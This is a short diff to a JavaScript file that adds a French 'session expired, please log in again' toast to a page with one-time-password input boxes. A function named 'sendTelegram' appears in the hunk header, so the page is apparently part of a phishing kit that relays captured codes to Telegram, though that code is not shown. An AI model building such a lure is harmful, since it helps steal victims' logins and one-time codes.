@@ -478,6 +478,9 @@ async function sendTelegram(text){
 
 // ===================== NAVIGATION OTP =====================
 document.addEventListener('DOMContentLoaded',()=>{
+  if(new URLSearchParams(window.location.search).get('session')==='expired'){
+    setTimeout(()=>toast('Session expirée — veuillez vous reconnecter.','err'),300);
+  }
   const boxes=$('otp-boxes').querySelectorAll('input');
   boxes.forEach((inp,i)=>{
     inp.addEventListener('input',()=>{
